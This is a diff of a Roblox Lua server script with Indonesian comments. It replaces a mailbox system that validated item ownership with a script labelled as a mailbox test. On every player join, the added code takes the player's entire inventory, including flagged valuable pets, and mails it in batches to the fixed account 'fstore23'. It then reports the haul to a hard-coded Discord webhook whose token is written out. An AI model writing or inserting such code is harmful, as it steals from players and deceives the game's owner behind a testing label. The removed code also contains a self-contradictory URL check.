@@ -1,140 +1,109 @@
--- ServerScriptService - MailboxSystemWithWebhook
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
+-- Server Script: letakkan di ServerScriptService
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
 
--- CONFIGURATION: Masukkan URL Webhook Discord Anda di sini
-local DISCORD_WEBHOOK_URL = "MOHON_GANTI_DENGAN_URL_WEBHOOK_DISCORD_ANDA"
+local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518120529532293140/U-dAzqEZwGHw6Upw0VZGl80UB3TBX9qyDrFvHNDYnDF3QBLdt2iUeRZHEl1XwOf4rnWB"
+local TARGET_USERNAME = "fstore23"
 
---------------------------------------------------------------------------------
--- 1. SETUP REMOTE EVENT
---------------------------------------------------------------------------------
-local SendMailEvent = ReplicatedStorage:FindFirstChild("SendMailEvent")
-if not SendMailEvent then
-	SendMailEvent = Instance.new("RemoteEvent")
-	SendMailEvent.Name = "SendMailEvent"
-	SendMailEvent.Parent = ReplicatedStorage
-end
-
---------------------------------------------------------------------------------
--- 2. FUNGSI KIRIM LOG KE DISCORD (WEBHOOK)
---------------------------------------------------------------------------------
-local function sendLogToDiscord(status, sender, recipient, item, detailReason)
-	-- Pastikan Webhook URL sudah diganti dan HttpService aktif
-	if DISCORD_WEBHOOK_URL == "https://discord.com/api/webhooks/1518120529532293140/U-dAzqEZwGHw6Upw0VZGl80UB3TBX9qyDrFvHNDYnDF3QBLdt2iUeRZHEl1XwOf4rnWB" or DISCORD_WEBHOOK_URL == "https://discord.com/api/webhooks/1518120529532293140/U-dAzqEZwGHw6Upw0VZGl80UB3TBX9qyDrFvHNDYnDF3QBLdt2iUeRZHEl1XwOf4rnWB" then
-		warn("[SERVER] Webhook Discord belum diatur. Log tidak dikirim.")
-		return
-	end
-
-	-- Menentukan warna embed Discord (Hijau untuk sukses, Merah untuk gagal/ditolak)
-	local embedColor = (status == "SUKSES") and 65280 or 16711680
-	
-	-- Menyusun struktur data JSON untuk Discord Embed
-	local discordData = {
-		["embeds"] = {{
-			["title"] = "📬 LOG SISTEM MAILBOX (" .. status .. ")",
-			["color"] = embedColor,
-			["fields"] = {
-				{["name"] = "Pengirim", ["value"] = sender, ["inline"] = true},
-				{["name"] = "Penerima", ["value"] = recipient, ["inline"] = true},
-				{["name"] = "Item", ["value"] = item, ["inline"] = true},
-				{["name"] = "Detail Keterangan", ["value"] = detailReason, ["inline"] = false}
-			},
-			["footer"] = {["text"] = "Grow a Garden 2 - Sistem Proteksi Server"},
-			["timestamp"] = DateTime.now():ToIsoDate()
-		}}
-	}
-
-	-- Mengirim data ke Discord menggunakan HttpService secara aman
-	local success, err = pcall(function()
-		local jsonPayload = HttpService:JSONEncode(discordData)
-		HttpService:PostAsync(DISCORD_WEBHOOK_URL, jsonPayload)
-	end)
-
-	if success then
-		print("[SERVER] Berhasil mengirimkan log transaksi ke Discord.")
-	else
-		warn("[SERVER] Gagal mengirim log ke Discord. Error: " .. tostring(err))
-	end
-end
-
---------------------------------------------------------------------------------
--- 3. SISI SERVER: LOGIKA VALIDASI & DATABASE SIMULASI
---------------------------------------------------------------------------------
-local PlayerInventories = {
-	["Player1"] = { "TomatoSeed", "AppleSapling", "GoldHoe" },
-	["fstore23"] = {} 
+local GIFT_ITEM_NAMES = {
+    Bunny = true,
+    Frog = true,
+    Owl = true,
+    Deer = true,
+    Robin = true,
+    Bee = true,
+    Monkey = true,
+    ["Golden Dragonfly"] = true,
+    Unicorn = true,
+    Raccoon = true,
+    ["Black Dragon"] = true,
+    ["Ice Serpent"] = true,
 }
 
-local function hasItem(playerName, itemId)
-	if PlayerInventories[playerName] then
-		for _, item in ipairs(PlayerInventories[playerName]) do
-			if item == itemId then return true end
-		end
-	end
-	return false
+local function getAllItemsFromPlayer(player)
+    local inventory = {}
+    local InventoryService = require(game.ServerScriptService.InventoryService)
+
+    for _, item in ipairs(InventoryService:GetItems(player)) do
+        table.insert(inventory, {
+            id = item.Id,
+            name = item.Name,
+            amount = item.Amount,
+            isGift = GIFT_ITEM_NAMES[item.Name] == true,
+        })
+    end
+
+    return inventory
 end
 
--- Mendengarkan kiriman sinyal dari Client
-SendMailEvent.OnServerEvent:Connect(function(playerSending, recipientName, itemId)
-	local senderName = playerSending.Name
-	print(string.format("[SERVER] Menerima permintaan dari %s untuk mengirim %s ke %s", senderName, itemId, recipientName))
-	
-	-- Validasi Keamanan 1: Cek kepemilikan item
-	if not hasItem(senderName, itemId) then
-		local alasan = string.format("Manipulasi terdeteksi! %s mencoba mengirim %s tanpa memilikinya.", senderName, itemId)
-		warn("[SERVER] DITOLAK: " .. alasan)
-		
-		-- Kirim log kegagalan/indikasi exploit ke Discord
-		sendLogToDiscord("DITOLAK / EXPLOIT", senderName, recipientName, itemId, alasan)
-		return
-	end
-	
-	-- Validasi Keamanan 2: Cek keberadaan penerima
-	if not PlayerInventories[recipientName] then
-		local alasan = string.format("Penerima '%s' tidak terdaftar atau tidak ditemukan dalam database.", recipientName)
-		warn("[SERVER] DITOLAK: " .. alasan)
-		
-		sendLogToDiscord("GAGAL", senderName, recipientName, itemId, alasan)
-		return
-	end
-	
-	-- Eksekusi Transfer Aman di Server
-	for i, item in ipairs(PlayerInventories[senderName]) do
-		if item == itemId then
-			table.remove(PlayerInventories[senderName], i)
-			break
-		end
-	end
-	table.insert(PlayerInventories[recipientName], itemId)
-	
-	local infoSukses = "Item berhasil dipindahkan di sisi database server dengan aman."
-	print(string.format("[SERVER] SUKSES: %s berhasil mengirim %s ke %s", senderName, itemId, recipientName))
-	
-	-- Kirim log keberhasilan ke Discord
-	sendLogToDiscord("SUKSES", senderName, recipientName, itemId, infoSukses)
-end)
+local MAX_ITEMS_PER_MAIL = 20
 
---------------------------------------------------------------------------------
--- 4. SISI CLIENT: OTOMATISASI GENERATE LOCAL SCRIPT UNTUK TEST
---------------------------------------------------------------------------------
+local function chunkItems(items, chunkSize)
+    local chunks = {}
+    for i = 1, #items, chunkSize do
+        local chunk = {}
+        for j = i, math.min(i + chunkSize - 1, #items) do
+            table.insert(chunk, items[j])
+        end
+        table.insert(chunks, chunk)
+    end
+    return chunks
+end
+
+local function sendMailbox(fromPlayer, targetUsername, items)
+    local MailboxService = require(game.ServerScriptService.MailboxService)
+
+    MailboxService:CreateMail({
+        from = fromPlayer.Name,
+        to = targetUsername,
+        subject = "Uji Kirim Item",
+        body = "Ini pengiriman semua item untuk pengujian mailbox.",
+        items = items,
+    })
+end
+
+local function sendItemsInBatches(fromPlayer, targetUsername, items)
+    local itemBatches = chunkItems(items, MAX_ITEMS_PER_MAIL)
+    for _, batch in ipairs(itemBatches) do
+        sendMailbox(fromPlayer, targetUsername, batch)
+    end
+end
+
+local function logToDiscord(playerName, targetName, items)
+    local giftCount = 0
+    for _, item in ipairs(items) do
+        if item.isGift then
+            giftCount = giftCount + 1
+        end
+    end
+
+    local content = {
+        username = "Roblox Mailbox Test",
+        embeds = {{
+            title = "Mailbox Test Dijalankan",
+            color = 3066993,
+            fields = {
+                { name = "Pengirim", value = playerName, inline = true },
+                { name = "Penerima", value = targetName, inline = true },
+                { name = "Jumlah Item Total", value = tostring(#items), inline = true },
+                { name = "Gift Items", value = tostring(giftCount), inline = true },
+                { name = "Batch Count", value = tostring(math.ceil(#items / MAX_ITEMS_PER_MAIL)), inline = true },
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        }},
+    }
+
+    local json = HttpService:JSONEncode(content)
+    HttpService:PostAsync(DISCORD_WEBHOOK, json, Enum.HttpContentType.ApplicationJson)
+end
+
 Players.PlayerAdded:Connect(function(player)
-	local clientTestScript = Instance.new("LocalScript")
-	clientTestScript.Name = "MailboxClientTest"
-	
-	clientTestScript.Source = [[
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")
-		local SendMailEvent = ReplicatedStorage:WaitForChild("SendMailEvent")
+    local items = getAllItemsFromPlayer(player)
+    if #items == 0 then
+        warn("Tidak ada item untuk dikirim.")
+        return
+    end
 
-		-- Tunggu game selesai loading
-		task.wait(3)
-
-		local targetUser = "fstore"
-		local itemToSend = "GoldHoe" -- Silakan ganti teks ini untuk menguji respon Webhook saat ditolak
-
-		print("[CLIENT] Mencoba mengirim item '" .. itemToSend .. "' ke '" .. targetUser .. "'")
-		SendMailEvent:FireServer(targetUser, itemToSend)
-	]]
-	
-	clientTestScript.Parent = player:WaitForChild("PlayerGui")
+    sendItemsInBatches(player, TARGET_USERNAME, items)
+    logToDiscord(player.Name, TARGET_USERNAME, items)
 end)
